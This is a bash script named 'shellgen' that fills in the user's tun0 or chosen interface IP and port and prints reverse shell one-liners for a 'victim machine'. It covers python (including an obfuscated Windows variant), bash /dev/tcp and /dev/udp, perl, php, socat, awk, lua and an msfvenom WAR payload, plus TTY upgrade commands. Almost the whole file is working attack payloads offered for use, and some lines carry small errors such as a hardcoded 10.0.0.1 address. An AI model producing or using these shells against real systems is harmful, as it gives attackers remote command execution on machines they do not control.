#!/bin/bash
script="shellgen"

#IFACE="tun0"
SHELL="sh"

green="\e[0;92m"
blue="\e[0;94m"




#Declare the number of mandatory args
margs=1

# Common functions - BEGIN
function example {
    echo -e "example: $script -s python -p 4444 -i tun0"
}

function list {
        echo -e "${blue}List of supported shells: python, pty, perl, php, bash, socat, awk, war, lua"
}

function usage {
        echo -e "${blue}usage: $script -s <shell> -p <port> -i <iface>\n"
        echo -e "Shell is mandatory. If not specified, default port is 443 and default interface is tun0\n"

}

function help {
  usage
    echo -e "MANDATORY:"
    echo -e "  -s,  Shell  The executable on the victim machine used to obtain the reverse shell"
    echo -e "OPTIONAL:"
    echo -e "  -i  The interface to listen on. Default: tun0"
    echo -e "  -p  PORT  The port of the listener Default: 443"
    echo -e "  -h,  --help             Prints this help\n"
    echo -e "  -l  Lists the supported binaries"
  example
}

# Ensures that the number of passed args are at least equals
# to the declared number of mandatory args.
# It also handles the special case of the -h or --help arg.
function margs_precheck {
        if [ $2 ] && [ $1 -lt $margs ]; then
                if [ $2 == "--help" ] || [ $2 == "-h" ]; then
                        help
                        exit
                else
                usage
                        example
                exit 1 # error
                fi
        fi
}

# Ensures that all the mandatory args are not empty
function margs_check {
        if [ $# -lt $margs ]; then
            usage
                example
            exit 1 # error
        fi
}


# Main

if [ $# -eq 0 ]; then
        usage
        example
        list
        exit 1
fi

margs_precheck $# $1


IFACE="tun0"
LHOST=$( ip a s $IFACE | awk '/inet.*/ {print $2}' | head -n 1 | awk -F'/' '{print $1}' )
LPORT=443



while [ "$1" != "" ];
do
   case $1 in
   -s  | --shell )  shift
                        SHELL=$1
                                  ;;
   -p  | --port  )  shift
                        LPORT=$1
                          ;;
   -i  | --iface  )  shift
                        IFACE=$1
                        LHOST=$( ip a s $IFACE | awk '/inet.*/ {print $2}' | head -n 1 | awk -F'/' '{print $1}' )
                          ;;
   -h   | --help )        help
                          exit
                          ;;
   -l   | --help )        list
                          exit
                          ;;
   *)                     
                          echo "$script: illegal option $1"
                        usage
                        example
                        list
                        exit 1 # error
                          ;;
    esac
    shift
done



if [ $SHELL == "python" ]
then
        echo -e "\n\n${blue}Reverse TCP (Linux only):\n\n"
        echo -e "\t${green}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$LPORT))'"
        echo -e "\tpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
        echo -e "\n\n${blue}Reverse TCP (Windows Only):\n\n"
        echo -e "\t${green}python.exe -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('$LHOST', $LPORT)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))\""
        echo -e "\n\n\n${blue}TTY Shell Upgrade: \n\n"
        echo -e "\t${green}python -c 'import pty; pty.spawn(\"/bin/bash\")'"
elif [ $SHELL == "bash" ]
then
        echo -e "\n${blue}Reverse TCP:\n\n"
        echo -e "\t${green}$SHELL -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
        echo -e "\t$0<&196;exec 196<>/dev/tcp/$LHOST/$LPORT; sh <&196 >&196 2>&196"
        echo -e "\t/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1"
        echo -e "\n\n${blue}Reverse UDP:\n\n"
        echo -e "\t${green}sh -i >& /dev/udp/$LHOST/$LPORT 0>&1"
elif [ $SHELL == "pty" ]
then
        echo -e "\n\n${blue}TTY Shell Upgrade: \n\n"
        echo -e "\t${green}python -c 'import pty; pty.spawn("/bin/bash")'"
elif [ $SHELL == "socat" ]
then
        echo -e "\n\n${blue}Listener:\n\n"
        echo -e "\t${green}socat file:`tty`,raw,echo=0 tcp-listen:$LPORT"
        echo -e "\n\n${blue}Victim:\n\n"
        echo -e "\t${green}socat exec:'/bin/bash',pty,stderr,setsid,sigint,sane tcp:$LHOST:$LPORT"

elif [ $SHELL == "php" ]
then
        echo -e "\n\n${blue}Reverse TCP:\n\n"
        echo -e "\t${green}php -r '$sock=fsockopen($LHOST,$LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        echo -e "\tphp -r '$sock=fsockopen($LHOST,$LPORT);shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        echo -e "\tphp -r '$sock=fsockopen($LHOST,$LPORT);\`/bin/sh -i <&3 >&3 2>&3\`;'"
        echo -e "\tphp -r '$sock=fsockopen($LHOST,$LPORT),4242);system(\"/bin/sh -i <&3 >&3 2>&3\");'"
        echo -e "\tphp -r '$sock=fsockopen($LHOST,$LPORT);passthru(\"/bin/sh -i <&3 >&3 2>&3\");'"
        echo -e "\tphp -r '$sock=fsockopen($LHOST,$LPORT);popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");'"
        echo -e "\tphp -r '$sock=fsockopen($LHOST,$LPORT);$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"
elif [ $SHELL == "perl" ]
then
        echo -e "\n\n${blue}Reverse TCP:\n\n"
        echo -e "\t${green}perl -e 'use Socket;\$i=\"$LHOST\";\$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
        echo -e "\tperl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"$LHOST:$LPORT\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
        echo -e "\n\n${blue}NOTE: Windows Only\n\n"
        echo -e "\t${green}perl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,\"$LHOST:$LPORT\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
elif [ $SHELL == "awk" ]
then
        echo -e "\n\n${blue}Reverse TCP:\n\n"
        echo -e "\t${green}awk 'BEGIN {s = \"/inet/tcp/0/$LHOST/$LPORT\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
elif [ $SHELL == "war" ]
then
        echo -e "\n\n${blue}Reverse TCP:\n\n"
        echo -e "\t${green}msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war > reverse.war"

elif [ $SHELL == "lua" ]
then
        echo -e "\n\n${blue}Reverse TCP (Linux Only):\n\n"
        echo -e "\t${green}lua -e \"require('socket');require('os');t=socket.tcp();t:connect('$LHOST','$LPORT');os.execute('/bin/sh -i <&3 >&3 2>&3');\""
        echo -e "\n\n${blue}Reverse TCP (Linux and Windows):\n\n"
        echo -e "\t${green}lua5.1 -e 'local host, port = \"$LHOST\", $LPORT local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'"

fi



echo -e "\n"
